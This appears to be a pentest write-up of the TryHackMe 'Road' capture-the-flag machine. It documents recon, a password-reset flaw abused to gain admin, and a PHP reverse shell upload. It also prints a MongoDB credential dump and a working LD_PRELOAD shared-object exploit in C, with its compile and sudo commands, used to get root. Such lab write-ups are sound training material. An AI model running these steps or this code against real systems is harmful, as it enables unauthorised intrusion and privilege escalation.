# 🛡️ Pentest Report: TryHackMe — Road (Medium)

## 1. Introduction
- **Date:** 12.09.2025  
- **Pentester:** ad4pt  
- **Target IP:** xxx.xxx.xxx.xxx  
- **Goal:** Identify vulnerabilities, exploit them, and obtain root access.  

---

## 2. Executive Summary
The penetration test of the *Road (Medium)* machine revealed multiple misconfigurations and vulnerabilities that allowed us to escalate privileges from a low-privileged web user to full root control.  

- **Open ports:** 22 (SSH), 80 (HTTP)  
- **Exploitation:** File upload vulnerability + insecure password reset → gained admin access  
- **Privilege Escalation:** Credential harvesting via MongoDB, then LD_PRELOAD abuse → root access  
- **Impact:** Full compromise of the system  

**Recommendation:** Patch web application logic, restrict DB access, and harden sudo rules.  

---

## 3. Methodology
1. **Reconnaissance:** Nmap scanning of open ports and services  
2. **Web Enumeration:** Directory brute forcing, CMS analysis, and login page investigation  
3. **Exploitation:** Abuse of password reset and file upload for PHP reverse shell  
4. **Privilege Escalation:** MongoDB credential discovery, SSH access, LD_PRELOAD misconfiguration  
5. **Post-Exploitation:** Root shell and flag retrieval  

---

## 4. Findings & Exploitation

### 4.1 Nmap Scan
Command used:
```bash
sudo nmap -sC -sV -Pn -p- xxx.xxx.xxx.xxx
```

**Results:**
- 22/tcp → SSH  
- 80/tcp → HTTP  

---

### 4.2 Web Enumeration
- Discovered directories using gobuster:  
  - `/phpmyadmin`  
  - `/index.php`  
  - `/v2` → redirected to `/v2/admin/login.html`  

- Found **login panel** with registration option.  

---

### 4.3 Exploitation of Web Application
1. Registered a new user → accessed profile section.  
2. Found **file upload function** (image upload).  
3. Discovered email `admin@sky.thm`.  
4. Abused **password reset** with Burp Suite: changed email parameter to `admin@sky.thm` → gained **admin access**.  
5. Uploaded **PHP reverse shell** → found file in `/v2/profileimages/`.  
6. Accessed shell via:
```
http://xxx.xxx.xxx.xxx/v2/profileimages/shell.php
```
7. Obtained shell as `www-data`.

---

## 5. Privilege Escalation

### 5.1 From www-data to webdeveloper
- Uploaded and ran **LinPEAS**.  
- Found `/usr/bin/mongod` running.  
- Connected to MongoDB locally:  
  ```bash
  mongo
  show databases
  use backup
  db.user.find()
  ```
- Extracted credentials:  
  - **User:** webdeveloper  
  - **Pass:** BahamasChapp123!@#  

- Logged in via SSH as `webdeveloper`.

---

### 5.2 From webdeveloper to root
- Checked sudo privileges:
```bash
sudo -l
```
- Found `/usr/bin/sky_backup_utility` executable with **LD_PRELOAD** allowed.  
- Created malicious shared object `shell.c`:
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/sh");
}
```
- Compiled and executed:
```bash
gcc -fPIC -shared -o /tmp/shell.so shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/sky_backup_utility
```
- Gained **root shell**.

---

## 6. Proof of Compromise
```bash
cat /root/root.txt
```

---

## 7. Recommendations
- Disable password reset parameter manipulation → validate user email properly.  
- Restrict file upload (file type validation, no PHP execution).  
- Remove unnecessary services (MongoDB exposed locally).  
- Update sudoers configuration → remove `env_keep+=LD_PRELOAD`.  
- Apply least privilege principle for user accounts.  

---

## 8. Appendix
- Nmap scan output  
- Gobuster results  
- MongoDB dump evidence  
- C exploit code for LD_PRELOAD  
